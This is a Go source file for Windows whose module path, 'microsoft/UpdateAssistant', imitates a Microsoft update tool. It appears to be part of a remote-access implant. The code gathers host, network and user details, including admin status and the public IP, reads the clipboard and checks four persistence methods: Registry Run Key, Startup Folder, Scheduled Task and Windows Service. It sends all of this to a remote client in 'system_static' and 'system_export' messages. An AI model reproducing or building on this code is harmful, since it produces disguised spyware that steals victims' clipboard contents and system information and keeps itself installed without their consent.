//go:build windows

package system

import (
	"fmt"
	"time"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

func sendStatic(s *session) {
	logger.Info("[system] sendStatic start")
	d := s.d
	osName  := pStr(d.osinfo, "os_name")
	osBuild := pStr(d.osinfo, "os_build")
	osArch  := pStr(d.osinfo, "os_arch")
	cpuName := pStr(d.cpu, "cpu_name")
	cpuCores := pNum(d.cpu, "cpu_cores")
	drives  := pStr(d.disk, "disk_drives")
	hostname := pStr(d.netinfo, "net_hostname")
	localIP  := pStr(d.netinfo, "net_local_ip")
	publicIP := sysutil.NetPublicIP()
	mac      := pStr(d.netinfo, "net_mac")
	userName := pStr(d.userinfo, "user_name")
	domain   := pStr(d.userinfo, "user_domain")
	isAdmin  := pNum(d.userinfo, "user_is_admin") == 1
	screenW  := pNum(d.screen, "screen_width")
	screenH  := pNum(d.screen, "screen_height")
	logger.Info("[system] sendStatic done, sending")
	s.client.Send("system_static", map[string]interface{}{
		"os": osName, "build": osBuild, "arch": osArch,
		"cpu": cpuName, "cpu_cores": cpuCores,
		"drives":    drives,
		"hostname":  hostname, "local_ip": localIP, "public_ip": publicIP, "mac": mac,
		"username":  userName, "domain": domain, "is_admin": isAdmin,
		"screen_w":  screenW, "screen_h": screenH,
		"version":   fmt.Sprintf("v%s-%s", config.Version, config.BuildHash),
		"time":      time.Now().Format("2006-01-02 15:04:05"),
		"data_path": config.DataPath(),
	})
}

func sendLive(s *session) {
	d := s.d
	s.client.Send("system_live", map[string]interface{}{
		"cpu_usage": pNum(d.cpu, "cpu_usage"),
		"ram_total": pU64(d.ram, "ram_total"),
		"ram_avail": pU64(d.ram, "ram_available"),
		"ram_pct":   pNum(d.ram, "ram_usage_pct"),
	})
}

func sendExport(s *session) {
	d := s.d
	clipBuf := make([]byte, config.CmdBuf)
	clipN, _ := d.clip.Call("clipboard_get", uintptr(unsafe.Pointer(&clipBuf[0])), uintptr(config.CmdBuf))

	type persistMethod struct {
		ID      string `json:"id"`
		Label   string `json:"label"`
		Enabled bool   `json:"enabled"`
	}
	var persistMethods []persistMethod
	if pdll, err := loader.Load("persistence"); err == nil {
		n := config.DisplayName() + ".exe"
		np := uintptr(unsafe.Pointer(loader.BytePtr(n)))
		boolCall := func(export string) bool {
			r, _ := pdll.Call(export, np)
			return int(r) == 1
		}
		persistMethods = []persistMethod{
			{"reg",     "Registry Run Key", boolCall("reg_enabled")},
			{"folder",  "Startup Folder",   boolCall("folder_enabled")},
			{"task",    "Scheduled Task",   boolCall("task_enabled")},
			{"service", "Windows Service",  boolCall("service_enabled")},
		}
		loader.Unload(pdll)
	}

	s.client.Send("system_export", map[string]interface{}{
		"os": pStr(d.osinfo, "os_name"), "build": pStr(d.osinfo, "os_build"), "arch": pStr(d.osinfo, "os_arch"),
		"cpu": pStr(d.cpu, "cpu_name"), "cpu_cores": pNum(d.cpu, "cpu_cores"), "cpu_usage": pNum(d.cpu, "cpu_usage"),
		"ram_total": pU64(d.ram, "ram_total"), "ram_avail": pU64(d.ram, "ram_available"), "ram_pct": pNum(d.ram, "ram_usage_pct"),
		"drives": pStr(d.disk, "disk_drives"), "hostname": pStr(d.netinfo, "net_hostname"),
		"local_ip": pStr(d.netinfo, "net_local_ip"), "mac": pStr(d.netinfo, "net_mac"),
		"username": pStr(d.userinfo, "user_name"), "domain": pStr(d.userinfo, "user_domain"),
		"is_admin": pNum(d.userinfo, "user_is_admin") == 1,
		"screen_w": pNum(d.screen, "screen_width"), "screen_h": pNum(d.screen, "screen_height"),
		"version":     fmt.Sprintf("v%s-%s", config.Version, config.BuildHash),
		"time":        time.Now().Format("2006-01-02 15:04:05"),
		"clipboard":   string(clipBuf[:int(clipN)]),
		"startup":     listStartupEntries(s),
		"persistence": persistMethods,
	})
}